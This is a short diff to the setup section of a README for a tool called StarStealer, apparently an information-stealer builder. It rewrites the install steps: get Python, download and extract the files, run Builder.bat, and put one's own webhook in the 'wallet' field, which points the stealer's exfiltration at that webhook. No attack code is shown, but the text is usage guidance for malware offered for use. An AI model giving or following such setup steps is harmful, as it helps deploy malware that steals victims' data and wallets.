@@ -28,9 +28,10 @@
 
 ### ✮⋆˙ Setting Up
 
-1. Install Python 3.10 [Or just run InstallPython.bat]
-2. Run BuildStar.bat
-3. Enjoy your working StarStealer
+1. Downloand and install [Python 3.10+](https://www.python.org/downloads/release/python-31016/) (Make sure to enable the Add to PATH option.)
+2. Download StarStealer files
+3. Extract the zip file and search for the Builder.bat then double click it
+4. Fill the wallet field with you webhook and enjoy
 
 ---
 <a id="features"></a>
